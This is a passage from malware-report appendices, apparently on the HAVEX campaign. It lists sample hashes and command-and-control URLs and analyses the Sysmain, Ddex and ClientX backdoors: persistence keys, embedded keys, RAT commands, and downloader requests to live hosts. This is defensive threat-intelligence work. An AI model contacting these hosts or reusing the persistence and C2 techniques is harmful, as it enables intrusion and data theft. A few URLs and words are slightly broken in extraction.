269ea4b883de65f235a04441144519cf6cac80ef666eccf073eedd5f9319be0f\nSize: 463920\nCompiled: Mon, 06 Aug 2012 12:42:06 UTC\nC2 URLs: mohsenmeghdari.com/includes/exifer1_5/source.php?id=\nalpikaclub.com/wp-includes/pomo/idx.php?id=\nnaturexperts.com/themes/bluemarine/node.php?id=\nwww.sdfgdsdf2354235il_jsaopwiowrhwkbfjk2345234532gssdrgesr.com/inc/eml_\ntemplates/source.php?id=\n\nSHA-256: 1ba99d553582cc6b6256276a35c2e996e83e11b39665523f0d798beb91392c90\nSize: 463920\nCompiled: Wed, 22 Aug 2012 09:34:45 UTC\nC2 URLs: www.snow-lab.com/modules/mod_search/tmpl/search.php?id=\nmotorjo.com/z/j/tiny_mce/plugins/media/source.php?id=\nforum.unmondeparfait.org/includes/search/source.php?id=\n\nwww.sdfgdsdf2354235il_jsaopwiowrhwkbfjk2345234532gssdrgesr.com/inc/eml_\ntemplates/source.php?id=\n\nHAVEX version 024\n\nSHA-256 778568b44e13751800bf66c17606dfdfe35bebbb94c8e6e2a2549c7482c33f7a\nSize: 452608\nCompiled: 2012-12-11 05:51:17\nSource URL: www.nahoonservices.com/wp-content/plugins/rss-poster/jungle.php\n\nSHA-256: 066346170856972f6769705bc6ff4ad21e88d2658b4cacea6f94564f1856ed18\nSize: 452608\n\n\n-----\n\nCompiled: Fri, 26 Oct 2012 10:12:03 UTC\n\nSHA-256: f1d6e8b07ac486469e09c876c3e267db2b2d651299c87557cbf4eafb861cf79c\nSize: 452608\nCompiled: Fri, 26 Oct 2012 10:12:03 UTC\n\nSHA-256: c987f8433c663c9e8600a7016cdf63cd14590a019118c52238c24c39c9ec02ad\nSize: 452608\nCompiled: Fri, 26 Oct 2012 10:43:23 UTC\n\nSHA-256: c25c1455dcab2f17fd6a25f8af2f09ca31c8d3773de1cb2a55acd7aeaa6963c8\nSize: 452608\nCompiled: Fri, 26 Oct 2012 12:13:07 UTC\n\nSHA-256: 593849098bd288b7bed9646e877fa0448dcb25ef5b4482291fdf7123de867911\nSize: 452608\nCompiled: Fri, 26 Oct 2012 12:13:07 UTC)\n\nSHA-256: 9d530e2254580842574a740698d2348b68b46fd88312c9325321ad0d986f523d\nSize: 452608\nCompiled: Fri, 26 Oct 2012 12:13:09 UTC\n\nC2 URLs: grafics.kz/plugins/search/source.php?id=\nwww.kino24.kz/blog/engine/modules/plugin/source.php?id=\nwww.idweb.ru/assets/modules/docmanager/classes/dm_source.php?id=\n\nSHA-256: 8e222cb1a831c407a3f6c7863f3faa6358b424e70a041c196e91fb7989735b68\nSize: 452608\nCompiled: Tue, 06 Nov 2012 08:55:54 UTC\nC2 URLs: baneh2net.com/wp-includes/pomo/idx.php\nask.az/chat/cgi-bin/source.php\npopolnyalka.uz/math/wp-includes/pomo/idx.php\n\nSHA-256: 6e5f4296bffa7128b6e8fa72ad1924d2ff19b9d64775bd1e0a9ce9c5944bd419\nSize: 452608\nCompiled: Tue, 06 Nov 2012 08:57:54 UTC\nC2 URLs: waytomiracle.com/physics/wp-includes/pomo/src.php\nanymax.ru/modules/mod_search/source.php\nogizni ru/wp includes/pomo/idx php\n\n\n-----\n\nSHA-256: 2dc296eb532097ac1808df7a16f7740ef8771afda3ac339d144d710f9cefceb4\nSize: 452608\nCompiled: Tue, 06 Nov 2012 09:06:18 UTC\nC2 URLs: cadlab.ru/components/com_search/com_search.php\nentirenetwork.ru/components/com_search/search.src.php\nradiolocator.ru/includes/domit/dom_xmlrpc_builder_src.php\n\nSHA-256: d3ee530abe41705a819ee9220aebb3ba01531e16df7cded050ba2cf051940e46\nSize: 452608\nCompiled: Tue, 06 Nov 2012 09:14:18 UTC\n\nSHA-256: 6122db2cdac0373cc8513c57786088a5548721d01e7674e78082774044e92980\nSize: 350382\nCompiled: Tue, 06 Nov 2012 09:14:18 UTC\nNotes: file is corrupted\n\nC2 URLs: hram-gelendzhik.ru/modules/mod_search/source.php\nfasdalf.ru/modules/forum/forum-src.php\nfortexcompany.ru/forms/FCKeditor/editor/plugins/bbcode/fckplugin.php\n\nSHA-256: bee9f2a01e0049d4cf94016284b16849136233366d1509489797084672e5448f\nSize: 452608\nCompiled: Wed, 19 Dec 2012 07:15:03 UTC\nC2 URLs: grafics.kz/plugins/search/source.php\ntopstonet.ru/modules/mod_search/source.php\nraznyi-content.ru/wp-includes/pomo/idx.php\n\nSHA-256: dc612882987fab581155466810f87fd8f0f2da5c61ad8fc618cef903c9650fcd\nSize: 452608\nCompiled: Thu, 20 Dec 2012 07:45:29 UTC\nC2 URLs: finadmition.ru/wp-includes/pomo/idx.php\nmedpunkt.biz/includes/modules/FCKeditor/fcksource.php\nintimit.ru/includes/phpmailer/source.php\n\nSHA-256: fd689fcdcef0f1198b9c778b4d93adfbf6e80118733c94e61a450aeb701750b4\nSize: 452608\nCompiled: Fri Oct 26 12:13:04 2012 UTC\nC2 URLs: grafics.kz/plugins/search/source.php\nwww kino24 kz/blog/engine/modules/plugin/source php\n\n\n-----\n\nwww.idweb.ru/assets/modules/docmanager/classes/dm_source.php\n\nHAVEX version 025\n\nSHA-256: 684ea2083f2f7099f0a611c81f26f30127ad297fcac8988cabb60fcf56979dfc\nSize: 459264\nCompiled: Mon, 24 Sep 2012 13:58:54 UTC\nC2 URLs: topco-co.com/wp-includes/pomo/idx.php?id=\ncrm.mayanks.com/vtigercrm/modules/Services/source.php?id=\ntickettotimbuktu.com/app/code/core/Mage/Rule/Model/Condition/Source.php?id\n\nHAVEX version 029\n\nSHA-256: cb58396d40e69d5c831f46aed93231ed0b7d41fee95f8da7c594c9dbd06ee111\nSize: 434688\nCompiled: Tue, 30 Apr 2013 06:53:24 UTC\nC2 URLs: adultfriendgermany.com/wp-includes/pomo/source.php\nadultfrienditaly.com/wp-includes/pomo/src.php\nadultfriendfrance.com/wp-includes/pomo/src.php\n\nHAVEX version 030\n\nSHA-256: 6367cb0663c2898aff64440176b409c1389ca7834e752b350a87748bef3a878b\nSize: 435712\nCompiled: Wed, 08 May 2013 05:12:53 UTC\nC2 URLs: adultfriendgermany.com/wp-includes/pomo/source.php\nadultfrienditaly.com/wp-includes/pomo/src.php\nadultfriendfrance.com/wp-includes/pomo/src.php\n\nHAVEX version 037\n\nSHA-256: 0e34262813677090938983039ba9ff3ade0748a3aba25e28d19e2831c036b095\nSize: 436736\nCompiled: Fri, 16 Aug 2013 05:49:18 UTC\nResource: ICT 0x69\nC2 URLs: jcaip.co.jp/inc/user/mysql_s.php\nshopcode.net/wp-includes/pomo/idx.php\ndl.3manage.com/services/ip/easy/idx.php\nSHA-256: 92c959c36617445a35e6f4f2ee2733861aa1b3baf8728d19a4fd5176f3c80401\nSize: 436736\n\n\n-----\n\nCompiled: Wed, 28 Aug 2013 07:21:28 UTC\nResource: ICT 0x69\nC2 URLs: blog.olioboard.com/wp-includes/pomo/idx.php\nblog.keeleux.com/wp-includes/pomo/idx.php\nalexvernigor.com/includes/phpmailer/source.php\n\nSHA-256: 0c9b20f4cb0b3206f81c2afbb2ee4d995c28f74f38216f7d35454af624af8876\nSize: 436799\nCompiled: Thu, 04 Jul 2013 12:54:48 UTC\nResource: ICT 0x69\nC2 URLs: serviciosglobal.com/inc/search.php\nzhayvoronok.com/wp-includes/pomo/idx.php\ndreamsblock.com/witadmin/modules/source.php\n\nHAVEX version 038\n\nSHA-256: ec48b131612ef5637b387d9c2b0907d68a080fb77c6168e779fb7f3a0efa04dc\nSize: 327168\nCompiled: Tue, 29 Oct 2013 06:09:24 UTC\nC2 URLs: pekanin.freevar.com/include/template/isx.php\nsimpsons.freesexycomics.com/wp06/wp-includes/po.php\ntoons.freesexycomics.com/wp08/wp-includes/dtcla.php\n\nSHA-256: c43ce82560cea125f65c7701c733c61ae3faa782c8b00efcb44fd7dbd32a5c4b\nSize: 327168\nCompiled: Tue, 29 Oct 2013 06:09:24 UTC\nC2 URLs: allcubatravel.com/roomHavana/Teresita/src.php\nkeeleux.com/wp/wp-includes/idx.php\nsunny-thumbs.com/ebonyaddiction/14/black-stockings-gangbang/source.php\n\nSHA-256: 401215e6ae0b80cb845c7e2910dddf08af84c249034d76e0cf1aa31f0cf2ea67\nSize: 327168\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nC2 URLs: zhayvoronok.com/wp-includes/pomo/idx.php\ndreamsblock.com/witadmin/modules/source.php\n38stalprof.com.ua/includes/domit/src.php\n\nSHA-256: ebb16c9536e6387e7f6988448a3142d17ab695b2894624f33bd591ceb3e46633\nSize: 327168\nCompiled: Mon 20 Jan 2014 13:38:43 UTC\n\n\n-----\n\nC2 URLs: www.pc-service-fm.de/modules/mod_search/src.php\nartem.sataev.com/blog/wp-includes/pomo/src.php\nswissitaly.com/includes/phpmailer/class.pop3.php\n\nSHA-256: 6b2a438e0233fe8e7ba8774e2e5c59bf0b7c12679d52d6783a0010ecad11978c\nSize: 327168\nCompiled: Tue, 29 Oct 2013 06:09:24 UTC\nC2 URLs: electroconf.xe0.ru/modules/mod_search/mod_search.src.php\nsinfulcelebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php\nrapidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-settings/bpsettings-src.php\n\nSHA-256: e3a7fa8636d040c9c3a8c928137d24daa15fc6982c002c5dd8f1c552f11cbcad\nSize: 327591\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nC2 URLs: www.pc-service-fm.de/modules/mod_search/src.php\nartem.sataev.com/blog/wp-includes/pomo/src.php\nswissitaly.com/includes/phpmailer/class.pop3.php\n\nSHA-256: f6aab09e1c52925fe599246dfdb4c1d06bea5c380c4c3e9c33661c869d41a23a\nSize: 327168\nCompiled: Mon, 30 Dec 2013 12:53:48 UTC\nC2 URLs: www.pc-service-fm.de/modules/mod_search/src.php\nartem.sataev.com/blog/wp-includes/pomo/src.php\nswissitaly.com/includes/phpmailer/class.pop3.php\n\nHAVEX version 040\n\nSHA-256: b8514bff04e8f4e77430202db61ec5c206d3ec0f087a65ee72c9bb94a058b685\nSize: 327168\nCompiled: Mon, 17 Feb 2014 09:35:14 UTC\nC2 URLs: adultfriendgermany.com/wp-includes/pomo/source.php\nadultfrienditaly.com/wp-includes/pomo/src.php\nadultfriendfrance.com/wp-includes/pomo/src.php\n\nHAVEX version 043\n\nSHA-256: 69b555a37e919c3e6c24cfe183952cdb695255f9458b25d00d15e204d96c737b\nSize: 437760\nCompiled: Tue 01 Apr 2014 10:59:19 UTC\n\n\n-----\n\nC2 URLs: electroconf.xe0.ru/modules/mod_search/mod_search.src.php\nsinfulcelebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php\nrapidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-settings/bpsettings-src.php\n\nSHA-256: 101e70a5455212b40406fe70361995a3a346264eabd4029200356565d2bacd6a\nSize: 458752\nCompiled: Tue, 01 Apr 2014 10:59:19 UTC\nC2 URLs:\n\nSHA-256: d5687b5c5cec11c851e84a1d40af3ef52607575487a70224f63458c24481076c\nSize: 437248\nCompiled: Fri, 11 Apr 2014 05:37:36 UTC\nC2 URLs: sinfulcelebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php\nrapidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-settings/bpsettings-src.php\n\nHAVEX version 044\n\nSHA-256: 1ef47da67f783f8cc8cda7481769647b754874c91e0c666f741611decd878c19\nSize: 438394\nCompiled: Wed, 07 May 2014 12:35:16 UTC\nC2 URLs: sinfulcelebs.freesexycomics.com/wp05/wp-admin/includes/tmp/tmp.php\nrapidecharge.gigfa.com/blogs/wp-content/plugins/buddypress/bp-settings/bpsettings-src.php\n\nSHA-256: 358da2c5bb5fbd9c9cf791536054bbb387ce37253c31555f5afa544f38de2a3f\nSize: 422499\nCompiled: Wed, 07 May 2014 12:35:16 UTC\nNotes: file is corrupted\n\nSHA-256: 4b547b3992838cfb3b61cb25f059c0b56c2f7caaa3b894dbc20bf7b33dadc5a1\nSize: 473092\nCompiled: Thu Jun 2 23:39:34 2011 UTC\nC2 URLs: www.iamnumber.com/modules/boonex/specialnumber/tmp.php\ndisney.freesexycomics.com/wp10/wp-includes/pomo/idx.php\nsolaed.ru/modules/mod_search/source.php\n\n\n-----\n\n# III. Appendix 3: The Sysmain backdoor – detailed analysis\n\nDetailed analysis of first identified sample of SYSMAIN RAT. The sample set contains two variants.\n\n**File metadata analyzed variant**\n\nSHA-256: d5e3122a263d3f66dcfa7c2fed25c2b8a3be725b2c934fa9d9ef4c5aefbc6cb9\nMD5: 418bfc05240ec86b91181f38bd751ccb\nVerdict: Trojan.Win32.Sysmain.c\nSize: 131584\nCompiled: Fri, 14 Dec 2012 17:50:05\nType: DLL\nC2 urls: 8bs.org/wp-content/plugins/akismet/iddx.php\nagu-inyaz.com/awstats/icon/flags/src.php\nhajaj-center.com/moon/fancybox/fancy_source.php\nwww.ferma.az/incfiles/classes/iddx.php\n\n**File metadata second variant**\n\nSHA-256: a8e6abaa0ddc34b9db6bda17b502be7f802fb880941ce2bd0473fd9569113599\nMD5: 875b0702ef3cc2d909ecf720bb4079c2\nVerdict: Trojan.Win32.Sysmain.e\nSize: 133152\nCompiled: Wed, 12 Jun 2013 09:31:14\nType: DLL\nC2 urls: ojoobo.com/modules/search/search.php\ngiant99.com/system/modules/SMTP/class.src.php\nantibioticsdrugstore.com/err/log/source.php\nwww.sinfulcomicsite.com/wp03/wp-includes/pomo/src.php\n\n**Other sysmain samples:**\n\nSHA-256: 31488f632f5f7d3ec0ea82eab1f9baba16826967c3a6fa141069ef5453b1eb95\nVerdict: Trojan.Win32.Sysmain.e\n\n\n-----\n\nSize: 133152\nCompiled: Mon, 08 Apr 2013 21:41:53 UTC\nC2 urls: www.sinfulcomicsite.com/wp03/wp-includes/pomo/src.php\nwww.christian-vedder.de/media/system/tmp/_tfpl.php\nblog.olioboard.com/wp-content/plugins/akismet/src.php\nmobitel.az/source/tmp/sdwrfq.php\n\nSHA-256: 53d2a3324f276f29c749727c20708a3421a5144046ce14a8e025a8133316e0ac\nVerdict: Trojan.Win32.Sysmain.b\nSize: 145440\nCompiled: Thu, 07 Jun 2012 08:40:54 UTC\nC2 urls: warteam.freetzi.com/wp-includes/pomo/idx.php\njetc.com/illegal_access_folder/source.php\nwww.eth-inc.com//new/moduls/source.php\ncrm.mayanks.in/include/tcpdf/config/source.php\n\nSHA-256: 81e5e73452aa8b14f6c6371af2dccab720a32fadfc032b3c8d96f9cdaab9e9df\nVerdict: Trojan.Win32.Sysmain.e\nSize: 133152\nCompiled: Thu, 21 Mar 2013 18:51:53 UTC\nC2 urls: 7adharat.com/forum/includes/search/log_search.php\nbuythepill.net/cart/checkout/set/sidx.php\nsico.ueuo.com/engine/modules/src.php\nmedpunkt.biz/includes/core/source.php\n\nSHA-256: dc75404b6fc8cdb73258c2cc7bc758347ffb4237c8d18222f3489dc303daf989\nVerdict: Trojan.Win32.Sysmain.d\nSize: 144991\nCompiled: Thu, 27 Oct 2011 04:59:50 UTC\nC2 urls: lankaranfc.com/360/resources/lankeran.php\naikidogroup.com/anjoman/inc/plugins/scoll.php\nsico.ueuo.com/engine/modules/src.php\n\nSHA-256: 387d4ea82c51ecda162a3ffd68a3aca5a21a20a46dc08a0ebe51b03b7984abe9\nVerdict: Trojan.Win32.Sysmain.e\nSize: 133223\nCompiled: Fri, 16 Aug 2013 06:14:30 UTC\nC2 urls: www.sinfulcomicsite.com/wp03/wp-includes/pomo/src.php\ngiant99.com/system/modules/SMTP/class.src.php\nwww christian vedder de/media/system/tmp/ tfpl php\n\n\n-----\n\nantibioticsdrugstore.com/err/log/source.php\n\n**Exports**\n\nRunDllEntry\n\nInstaller:\n\n- Copies itself to %APPDATA%\\sydmain.dll\n\n- Call RunReg (see below)\n\n- Call AGTwLoad if binary not installed already\n\nAGTwLoad\n\n- Initializes the malware and starts C2 communication\n\n- Create internal Victim-ID: $victim-id=’HKCU/Identities/Default User ID’+’-18890}’\n\n    - `example1: {8B01CFB5-FF66-4404-89E2-27E06475EA38}-18890}`\n```\n      (query for ‘HKCU/Identities/Default User ID’ was successful)\n\n```\n    - `example2: {AD-18890}`\n```\n      (query for ‘HKCU/Identities/Default User ID’ was NOT successful)\n\n```\n- Create Muxtex: $victim-id\n\n- Add itself to %PATH%\n\n- Call RunReg (see below)\n\n- Call GPI (see below)\n\n- Create another Victim-ID: $victim-id2=’HKCU/Identities/Default User ID’+’-01890}’\n\n    - `example1: {8B01CFB5-FF66-4404-89E2-27E06475EA38}-01890}`\n```\n      (query for ‘HKCU/Identities/Default User ID’ was successful)\n\n```\n    - `example2: {ED-01890}`\n```\n      (query for ‘HKCU/Identities/Default User ID’ was NOT successful)\n\n```\n- Open Mutex $victim-id2 and create remote thread in corresponding process for C2\ncommunication\n\nGPI\n\nInitializes the key infrastructure in registry and generates an external Victim-ID:\n\n- Generate random Victim-ID\n\n    - `‘HKCU/Identities/Default User ID’ + ‘-’ + $currentCursorPos + ‘-’ +`\n```\n      $currentPID+’-TUS’\n\n```\n    - If query for ‘HKCU/Identities/Default User ID’ was NOT successful: ‘AUTO’ +\n```\n      $stringOfRandomInteger + ‘ ’ + $c rrentC rsorPos + ‘ ’ + $c rrentPID+’ TUS’\n\n```\n\n-----\n\n- Setup crypt key infrastructure with keys in registry (valid for both variants)\n```\nKeys (stored in “Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD”)\n(‘prv’) - used to decrypt incoming c2-communication\n\n```\ndb ‘AATnkDHDlO+cOi/6zqUVoaA2DfbTyIoP8y1+Q5MxLfimzeQFgJvk/mdHDjghFl5p2’\n```\ndb ‘naTmm9y6IAQ2JZpTFhW1WVqC6a8sipU62zO94YwwqtThm+0citlfP4NyEm79c9Qok’\ndb ‘0S4wG9+87/9FPLbZG9h0DNBTjWDqyoyQP6Hy7r0ty/nwAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\n\n```\ndb ‘AAAAAAAAAAAAAAAAQABpCpH/X6TONDPvyHNS76gFHJl8NMVfiVKtV829QDAbZE9/O’\n```\ndb ‘CmpPvvQCLGjD6NhMIKmq48INzQHiFO0Sv83OLA18pc18oIfDBtkyBnZRoaIrw3+tn’\ndb ‘sLwpEtYRtJ3axE4lT8ZBZ6Zu0EPXjqPkqbxH1RqF4pjBx1Rj15Ky/h1J+CwH0Ftmu’\ndb ‘gRGp/CISiQDvB3kDRFjp42s0xOyce8jhmSNH5+E2PM3cXqCknRdIf6ZDRO2alMdds’\ndb ‘TJhPV0S7hl+LNbB8tzetjZ6zRsZL46NGcj2p6bfQ1jMrgwPWI1Run8uin/YjnTyHp’\ndb ‘ecKai3AWGFHo8SR5dJkFpHb07R1wmlMZqOXyVqc0fapRiHe7mXorsBTD2B9pczszV’\ndb ‘Nkm+SUgKy9MOK+ezUeUH0h290XSNR3eyl3j453C2ygeSCAYhrUyESQoGQgF57KDs0’\ndb ‘4pS/uR+3Yd1wr1dUKPfP7xkKZTtlrdqxSZQ+XtLY5PhjySDqT233WsVTl26L10t9r’\ndb ‘PYp7nE97Godz8DXn8HfCsqRvYwdwfrOD3cpAnBL2u6gU/G5Cvw47QyiCF96iMMPuW’\ndb ‘Vq25/xLj9Zc+aWMtS9+jVKxnlnvdaxIQ==’,0\n(‘pubm’) - used to encrypt outgoing c2-communication\ndb ‘AAStvhUWRdUCbz2jXG52xG6OXgtHxG9Qd/ckNJ2tQHZAfxDI/H3lmxy2JXILgri/h’\ndb ‘pf0taVjAbfsohMc+aBndaYkQa73k/WPXvi8lFFCbKBBGVfj7xo4CmiEC5blZCHDNt’\ndb ‘E6poNeUFKddcXXQAeGOwcvQmVHSxQn+uHIS+VqetyEaQAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAQAB’,0\n\n```\n(‘pub’) - used to encrypt files\n\ndb ‘AATnkDHDlO+cOi/6zqUVoaA2DfbTyIoP8y1+Q5MxLfimzeQFgJvk/mdHDjghFl5p2’\n```\ndb ‘naTmm9y6IAQ2JZpTFhW1WVqC6a8sipU62zO94YwwqtThm+0citlfP4NyEm79c9Qok’\ndb ‘0S4wG9+87/9FPLbZG9h0DNBTjWDqyoyQP6Hy7r0ty/nwAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA’\ndb ‘AAAAAAAAAAAAAAAAQAB’,0\n\n```\nAGTwRec:\n\nGathers victim information and stores it in an encrypted XML like file in %TEMP%\n\n\n-----\n\nThe path to this file is saved in registry (XORed with 0x05)\n```\nSoftware\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD, sN (where N:= [0,x[)\nexternal Victim-ID generated in GPI\nUsername\nComputername\nCountry\nLanguage\nNation\nType of Internet connection\nCurrent IP\nDrive information\nDefault browser\nProcess list\n\n```\nListing of files in User-Profile-Directory\n\nSendThisFile\n\nEncrypts arbitrary file with “pub”-key and save it to local dropzone (%temp%) as sN (where\nN:=[0,x])\n\n\n-----\n\nRenameExecute\n\nRenames itself and its startup-entry in registry\n\nRunReg\n\nCreates startup-entry in registry\n```\nSoftware\\Microsoft\\Windows\\CurrentVersion\\Run, load=”%PathToRundll32% %appdata%\\\nsydmain.dll, AGTwLoad”\n\n```\nSharedRegistry:\n\nUsed at install, adds itself to %PATH%\n\nBD:\n\nEncodes string with base64 using crypt32.dll, CryptBinaryToStringA\nFlags: (CRYPT_STRING_BASE64,CRYPT_STRING_NOCRLF)\n\nUB:\n\nEncodes string with base64 using crypt32.dll, CryptBinaryToStringA\nFlags: (CRYPT_STRING_BASE64)\n\nCF:\n\nEncrypts file with given key (called by non-public file-encryptor using “pub”-key)\n\nOF:\n\nDecrypts string with given key (called by non-public c2-communicator using “prv”-key)\n\nVD:\n\nEncrypts string with given key (called by non-public c2-communicator using “pubm”-key)\n\n**RAT Commands used by attacker**\n\n- `“e e” execute file sent from c2`\n\n\n-----\n\n- `“dll”: load dll sent from c2`\n\n- `“get”: read file from disk, encrypt (with “pub”-key) and save it to local dropzone, filename in`\nregistry under sN\n\n- `“dir”: not fully implemented or prefix of next command`\n\n- `“rec”: save directory listing and save it to local dropzone, filename in registry under sN`\n\n- `“cer”: replace “pubm”-key in registry (used for c2-communication)`\n\n- `“srv”: manipulates a nN and/or pN-entry in registry`\n\n- `“lst”: deletes nN and Pn-entries in registry, creates new nN and pN-entries`\n\n- `“cmd”: execute shell-command (via cmd.exe)`\n\n- `“rcp”: gather victim data (calls AGTwRec)`\n\n- `“cls”: delete registry entries`\n\n**Exemplary registry entries:**\n\n**Path:** `HKCU\\Software\\Microsoft\\Internet Explorer\\InternetRegistry\\SNLD`\n\n- `ID: Unique bot-id (see above)`\n\n- `prv: priv key (encrypt msg c2)`\n\n- `pubm: pub key (decrypt msg from c2)`\n\n- `pub: pub key (file encryption)`\n\n- `nN: random data`\n\n- `pN: random data`\n\n- `sN: XOR(5)-encrypted path (unicode) of (encrypted) files containing collected victim-data or`\ndumped files form hdd\n\nFor entries nN, pN, sN → N:=[0,x]\n\n\n-----\n\n# IV. Appendix 4: Ddex loader – detailed analysis\n\n**Binaries metadata**\n\nSHA-256: 3094ac9d2eeb17d4cda19542f816d15619b4c3fec52b87fdfcd923f4602d827b\nSize: 24576\nCompiled: Mon, 18 Oct 2010 08:13:57 UTC\n\nSHA-256: 7a115335c971ad4f15af10ea54e2d3a6db08c73815861db4526335b81ebde253\nSize: 14296\nCompiled: Thu, 28 Oct 2010 11:29:05 UTC\nNotes: contains additional “print” export, which calls the main malware function\nwithout creating a thread\n\nSHA-256: 76b272828c68b5c6d3693809330555b5a1a6a8bda73228c8edc37afca78a21d6\nSize: 13312\nCompiled: Thu, 28 Oct 2010 11:29:05 UTC\nNotes: practically identical to 7a11…\n\nSHA-256: 377a9c610cc17bbf19470b1a3f847b74e0f56d4f4fd57a3298c630dab403acea\n\nSize: 15360\nCompiled: Wed, Nov 24 2010 09:47:09 UTC\nNotes: practically identical to 7a11...\n\nAll binaries have basically the same functionality - they serve as downloaders for other malicious\ncode.\n\n**Code flow:**\n\n- Check / create mutex “(6757)”\n\n- Check if it’s run by ddex.exe or explorer.exe; if not, create remote thread in explorer.exe\nmemory, which loads %TEMP%\\Low\\~tmppnet.dll\n\n- Set the autorun value:\n```\n  HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\n  Load=”%TEMP%\\Low\\ddex.exe”\n\n```\n- Create a remote thread in explorer.exe, which loads %TEMP%\\Low\\ddex.exe\n\n\n-----\n\n```\n  index.cgi/?loc=258\n\n```\n- Get systime and write it to %TEMP%\\Low\\~ntp.tmp\n\n- Get windows version\n\n- Look for malicious data by sending following request to the specified URLs:\n```\n  http://kitexgarments.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s\n  http://creloaded.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s\n  http://10bestsearch.com/ext/index2.php?t=%s&o=%s&i=%s&task_id=%s\n  [t = base64 encoded time string / o = os version / i = data from thetimenow.com or\n  NULL / task_id = content of ~task.tmp or string “done”]\n\n```\nExample request:\n```\n  /ext/index2.php/?t=MjAxNDEyNzE0NQ==&o=XP_SP3&i=&task_id=done\n\n```\nHost information at the time of analysis:\n```\n  kitexgarments.com\n  resolves to 66.39.134.254,\n  alive\n\n```\nGET request to specified file returns “<XAML></XAML>”\n```\n  creloaded.com\n  resolves to 174.37.240.18,\n  alive,\n\n```\nGET request to specified file returns 404\n```\n  10bestsearch.com\n  resolves to 195.16.89.46,\n  alive,\n\n```\nGET request to specified file returns 404\n\nHeaders:\n```\n  User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US) AppleWebKit/534.3\n  (KHTML, like Gecko) Chrome/6.0.472.59 Safari/534.3\n  Accept: text/xml\n  Content-Type: application/x-www-form-urlencoded\n  Accept-Encoding: no\n  Connection Keep Ali e\n\n```\n\n-----\n\n- If the string “<XAML></XAML>” is in the returned HTML code, exit; otherwise:\n\n    - Read content that is between tags <I6></I6> and write it to the file %TEMP%\\Low\\~task.\n```\n      tmp\n\n```\n    - Read content that is between tags <B6></B6>, xor it with 0x0A and write it to the %TEMP%\\\n```\n      Low\\~ldXXXX.TMP file, then load this file to the memory\n\n```\n\n-----\n\n# V. Appendix 5: The ClientX backdoor – detailed analysis\n\nThe ClientX backdoor binaries were found in an open directory on one of the C2 servers.\nThey consist of two .NET files. One of them is called client.exe, which is the main malware\ncomponent. The second is library.dll, which provides functions to client.exe.\n\nCompiled on: Mon Mar 04 13:23:46 2013\nFile size: 81 920 bytes\nSHA256: D449AEDACCA27E61B8FAE3FCF0E40C29C53ED565E23ED64B6F5528287B547BD2\n\nThe client.exe file has built-in debug messages, but the binary was compiled as a GUI application. By\nediting the PE header, it is possible to change it back to console, and see real time debug messages\nas the malware operates:\n\nHere is what is displayed upon execution:\n\nSleep 10 seconds\nOne instance\nupd cleaner\nupd cleaner done\n\nmain loop\nsettingcheck\nRegIeDir\nRegIeDir done\nrun-work\nLM no error\nLM no error\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\nrun-work done\nwork\nrun-work done 2\nBOTID\nsettingcheck doneº\nANSWER\n0\n\n\n-----\n\nbegin work\nend work\nLOOP END\n\n**Code flow:**\n\nUpon execution, client.exe starts by sleeping for 10 seconds. It then creates a Mutext called “clientX”\nto check whether other instances of the malware are already running. If no other instance of the\nmalware is found, it will write “One instance” and continue execution. Otherwise, it will print out\n“More than one instance” and terminate.\n\nImmediately after creating the Mutex the “cleaner” method is called. (Debug message: “upd\ncleaner”). This method looks for all executables in the current folder and deletes files with names\nthat do not match some file property criteria.\nThis is used to delete older versions of the RAT after a successful update (See the commands UPD\nlater described in this appendix)\n\n**5.1. Main loop**\n\nThe backdoor then starts the main loop, which is an infinite while loop. (Debug message: “main\nloop”).\n\n**5.1.1 Setting check**\n\nSome settings are checked by the backdoor. (Debug message: “setting check”)\nThe Settings Check method from the check class is used.\n\n**5.1.2 RegIeDir**\n\nAfter the debug message “RegIeDir”, the following registry key is opened “HKEY_CURRENT_USER\\\\\nSOFTWARE\\\\Microsoft\\\\Internet Explorer” and the subkey “InternetRegistry” is checked. If not\nfound, a subkey is created. That part is closed by a debug message: “RegIeDir done”.\n\n**5.1.3 Run-work**\n\nThe “run-work” debug message indicates that the malware is gathering two registry keys for later\nuse. There is a structure named “prSettings” with the following fields:\n\npublic struct prSettings\n{\n\n\n-----\n\npublic string[] servers;\npublic string id;\npublic int timeout;\npublic string pub;\npublic string priv;\npublic RegistryKey KeyRun;\npublic RegistryKey KeyWork;\n}\n\nThe last two fields “prSettings.KeyRun” and “prSettings.KeyWork” are the one filled by “run-work”.\n\n“KeyRun” will hold “SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run”, either 